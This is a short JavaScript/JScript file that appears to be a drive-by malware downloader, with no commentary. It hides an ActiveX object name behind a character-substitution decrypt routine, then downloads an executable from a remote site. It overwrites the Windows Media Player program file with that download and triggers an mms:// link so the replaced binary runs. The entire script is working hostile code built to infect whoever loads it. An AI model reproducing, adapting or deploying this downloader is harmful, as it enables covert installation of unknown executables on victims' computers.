var letters = 'ghijklabvwxyzABCDEFef)_+|<>?:mnQRSTU~!@#$%^VWXYZ`1234567opGHIJKLu./;'+"'"+'[]MNOP890-='+'\\'+'&*("{},cdqrst '+"\n";
var split = letters.split("");
var num = '';
var c = '';
var encrypted = '';

function decrypt(it)
{
	var b = '0';
	var chars = it.split("");
	while(b<it.length)
	{
		c = '0';
		while(c<letters.length)
		{
			if(split[c] == chars[b])
			{
				if(c == "0") 
				{ 
					c = ""; 
				}
				if(eval(c-10) < 0)
				{
					num = eval(letters.length-(10-c));
					encrypted += split[num];
				}
				else
				{
					num = eval(c-10);
					encrypted += split[num];
				}
			}
			c++;
		}
		b++;
	}
	
	return encrypted;
}

var x = new ActiveXObject("Microsoft.XMLHTTP"); 
x.Open("GET", "http://www.neededware.com/downloads/ndw/ndw.exe",0); 
x.Send(); 

var s = new ActiveXObject(decrypt("+>(>|8VblmD#"));
s.Mode = 3;
s.Type = 1;
s.Open();
s.Write(x.responseBody);

s.SaveToFile("C:\\Program Files\\Windows Media Player\\wmplayer.exe",2);
location.href = "mms://";